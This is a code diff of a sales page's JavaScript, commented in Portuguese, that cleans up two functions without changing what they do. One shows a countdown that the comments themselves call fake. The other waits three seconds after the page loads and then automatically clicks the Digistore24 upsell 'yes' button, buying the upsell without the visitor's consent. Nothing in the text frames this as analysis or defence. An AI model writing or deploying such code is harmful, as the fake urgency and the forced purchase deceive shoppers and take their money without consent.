@@ -1,16 +1,13 @@
 document.addEventListener('DOMContentLoaded', () => {
 
-    // ====================== TIMER FALSO VISÍVEL NA PÁGINA ======================
+    // ====================== TIMER 444 FALSO VISÍVEL ======================
     function startFakeTimer() {
         const timerContainer = document.getElementById('offer-countdown-container');
         const timerDisplay = document.getElementById('offer-countdown-display');
-
         if (!timerContainer || !timerDisplay) return;
-
         timerContainer.style.display = 'block';
 
-        let duration = 5 * 60; // 5 minutos
-
+        let duration = 5 * 60;
         const timerInterval = setInterval(() => {
             let minutes = parseInt(duration / 60, 10);
             let seconds = parseInt(duration % 60, 10);
@@ -28,7 +25,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }, 1000);
     }
 
-    // ====================== AUTO-CLICK DO DIGISTORE24 (simples e 100% garantido) ======================
+    // ====================== AUTO-CLICK DO DIGISTORE24 (CORRIGIDO) ======================
     function executeAutoPurchase() {
         const loadingCSS = `
             <style id="loading-style">
@@ -42,20 +39,17 @@ document.addEventListener('DOMContentLoaded', () => {
         document.head.insertAdjacentHTML('beforeend', loadingCSS);
         document.body.insertAdjacentHTML('beforeend', loadingHTML);
 
-        const seletorBotao = '#ds24-upsell-yes-button a.btn';
-
         setTimeout(() => {
-            const botao = document.querySelector(seletorBotao);
+            const botao = document.querySelector('#ds24-upsell-yes-button a.btn');
             if (botao) {
                 botao.click();
-                console.log("✅ Botão do upsell clicado automaticamente! (script simples e direto)");
+                console.log("✅ Botão clicado automaticamente!");
             } else {
-                console.error("❌ Botão do upsell não encontrado.");
+                console.error("❌ Botão não encontrado.");
             }
         }, 3000);
     }
 
-    // ====================== INÍCIO ======================
-    startFakeTimer();           // timer visível na página
-    executeAutoPurchase();      // clica no botão verde
+    startFakeTimer();
+    executeAutoPurchase();
 });
